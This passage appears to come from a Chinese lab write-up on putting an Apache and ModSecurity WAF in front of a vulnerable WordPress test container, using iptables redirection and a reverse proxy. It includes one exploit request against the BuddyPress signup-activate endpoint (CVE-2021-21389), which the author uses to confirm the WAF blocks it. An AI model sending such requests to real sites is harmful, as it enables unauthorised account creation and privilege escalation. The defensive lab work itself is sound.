   - 可以访问成功，说明流量绕过了 WAF。

---

## **解决方案**

### **1. 检查 iptables 规则**

#### **查看当前 iptables 规则**
运行以下命令，查看当前的 iptables 规则：
```bash
sudo iptables -t nat -L -n -v
```

#### **确保规则正确**
检查是否有以下规则：
```bash
Chain PREROUTING (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         
    0     0 REDIRECT   tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:8080 redir ports 81
```

如果没有这条规则，说明 iptables 规则未生效。重新添加规则：
```bash
sudo iptables -t nat -A PREROUTING -p tcp --dport 8080 -j REDIRECT --to-port 81
```

#### **保存 iptables 规则**
确保规则在重启后仍然生效：
```bash
sudo iptables-save | sudo tee /etc/iptables/rules.v4
```

---

### **2. 检查 Apache 反向代理配置**

#### **确认 Apache 配置文件**
1. 打开 Apache 的虚拟主机配置文件：
   ```bash
   sudo vim /etc/apache2/sites-available/000-default.conf
   ```

2. 确保配置如下：
   ```bash
   <VirtualHost *:81>
       ProxyPreserveHost On
       ProxyPass / http://127.0.0.1:8080/
       ProxyPassReverse / http://127.0.0.1:8080/
   </VirtualHost>
   ```

3. 保存并退出编辑器。

#### **确认端口配置文件**
1. 打开 Apache 的端口配置文件：
   ```bash
   sudo vim /etc/apache2/ports.conf
   ```

2. 确保 Apache 监听 `81` 端口：
   ```bash
   Listen 81
   ```

3. 保存并退出编辑器。

#### **重启 Apache**
```bash
sudo systemctl restart apache2
```

---

### **3. 检查 Target Server 监听地址**

#### **确认 Target Server 绑定到 `localhost`**
1. 修改 Target Server 也就是wordpress服务的docker，使其仅监听 `127.0.0.1:8080`。
   - 例如，如果 Target Server 是一个 Java 应用，可以在启动命令中指定绑定地址：
     ```bash
     ┌──(kali㉿kali)-[~/workspace/ctf-games/fofapro/vulfocus]
      └─$ docker run -d \
      --name wordpress-vul \
      -p 127.0.0.1:57039:80 \
      -p 127.0.0.1:25926:3306 \
      vulfocus/wordpress_cve-2021-21389:latest

      e63753ca437f362b7233e9290d8fbbbde9bffe16e72b9be91bb577ea7d64d76c
     ```
     ![1747963177042](image/readme/1747963177042.png)
   在 Docker 容器中，``127.0.0.1`` 指的是容器内部的回环接口，而不是宿主机的回环接口。因此，即使容器的 80 端口映射到了宿主机的 57039 端口，外部请求也无法通过宿主机的 IP 地址和端口访问到容器中的应用程序，因为应用程序只监听容器内部的 ``127.0.0.1``
   - 重启docker 容器
   ![1747963395690](image/readme/1747963395690.png)
   ![1747963425567](image/readme/1747963425567.png)

2. 确保 Target Server 不再监听外部地址（如 `0.0.0.0:8080`）。

---

### **4. 测试配置**

#### **测试 iptables 重定向**
1. 运行以下命令，测试 iptables 重定向是否生效：
   ```bash
   curl http://<Target-IP>:8080/
   ```
   - 如果配置正确，流量会被重定向到 `81` 端口，并经过 WAF。

2. 检查 Apache 日志，确认请求是否被正确处理：
   ```bash
   tail -f /var/log/apache2/access.log
   ```

#### **测试 WAF 拦截**
1. 发送包含恶意 payload 的请求：
   ```bash
   curl -X PUT -d '{"user_login": "attacker5", "user_email": "attacker5@163.com", "user_name": "attacker5", "password": "attacker5"}' http://192.168.20.12:57039/wp-json/buddypress/v1/signup/activate/2pnXFe3HAC3A5SPWCf5OPbWd3LVO3C
   ```
2. 检查是否返回 `403 Forbidden`，并查看 ModSecurity 日志：
   ```bash
   tail -f /var/log/apache2/modsec_audit.log
   ```

   这时我们再curl 一下,会发现了返回我们想要的指定指令,证明了我们攻击防御成功!
   - `curl wordpress` 服务所在的8080端口返回的内容 `could not connect to server`
   - `curl WAF` 服务所在的81端口返回的内容 `403 Forbidden`
   ![1747963078269](image/readme/1747963078269.png)


- **目前的网络拓扑图:**
```bash
+-------------------+       +-------------------+       +-------------------+
|      Client       | ----> |     WAF (Apache   | ----> |   Target Server   |
|    (curl 请求)    |       |   + ModSecurity)  |       | (Wordpress 测试环境) |
+-------------------+       +-------------------+       +-------------------+
        |                           |                           |
        | 1. 发送请求到 81           | 2. 重定向到 23509          | 3. 处理请求
        | ------------------------> | ------------------------> |
        |                           |                           |
        |                           | 4. 拦截恶意请求            |
        |                           | (返回 403 Forbidden)      |
        | <------------------------ |                           |
        |                           |                           |
        |                           | 5. 记录日志                |
        |                           | (modsec_audit.log)        |
```

```bash
+-------------------+       +-------------------+       +-------------------+
|      Client       | ----> |     WAF (Apache   | ----> |   Target Server   |
|    (curl 请求)    |       |   + ModSecurity)  |       | (Wordpress 测试环境) |
+-------------------+       +-------------------+       +-------------------+
        |                                                     |
        |                      1. 发送请求到 23509           
        | ---------------------------------------------------> |
        |                            2. iptables 重定向到 81
                                    <------------------------ 
                                     3. 处理请求
        |                           |
        |                           | 4. 拦截恶意请求              |
        |                           | (返回 403 Forbidden)        |
        | <------------------------ |                             |
        |                           |                             |
        |                           | 5. 记录日志                  |
        |                           | (modsec_audit.log)          |
```
